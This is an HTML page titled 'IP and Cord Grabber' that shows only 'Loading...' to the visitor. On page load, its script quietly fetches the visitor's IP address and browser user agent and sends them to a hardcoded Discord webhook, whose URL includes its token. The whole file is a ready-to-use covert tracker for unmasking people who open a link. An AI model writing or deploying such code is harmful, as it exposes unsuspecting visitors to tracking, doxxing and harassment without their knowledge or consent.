<!DOCTYPE html>
<html>
<head>
    <title>IP and Cord Grabber</title>
    <script>
        function sendData() {
            const webhookUrl = 'https://discord.com/api/webhooks/1408171424136302612/n6QRA4_p0gZdLNtfqTG8v6csp0simByjXyMXimc5PWRykziMTScS9HBYH5AxU8dDiA1m'; // Replace with your webhook URL

            // Get user's IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    // Get user's device information
                    const userAgent = navigator.userAgent;
                    const deviceInfo = {
                        ip: userIP,
                        userAgent: userAgent
                    };

                    // Send data to webhook
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(deviceInfo)
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Data sent successfully:', data);
                    })
                    .catch(error => {
                        console.error('Error sending data:', error);
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        }

        // Call the function to send data when the page loads
        window.onload = sendData;
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
